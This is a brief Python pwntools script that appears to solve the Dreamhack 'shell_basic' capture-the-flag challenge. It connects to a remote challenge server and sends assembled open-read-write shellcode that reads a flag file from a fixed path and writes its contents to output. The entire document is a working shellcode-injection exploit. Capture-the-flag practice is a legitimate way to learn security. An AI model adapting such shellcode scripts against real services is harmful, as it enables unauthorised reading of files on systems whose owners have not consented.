from pwn import *
p = remote("host3.dreamhack.games",8741)


context.arch = "amd64"
r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ''
shellcode = shellcraft.open(r)
shellcode += shellcraft.read('rax','rsp',0x100)
shellcode += shellcraft.write(1,'rsp','0x100')

p.sendafter("shellcode: ", asm(shellcode))
print(p.recv())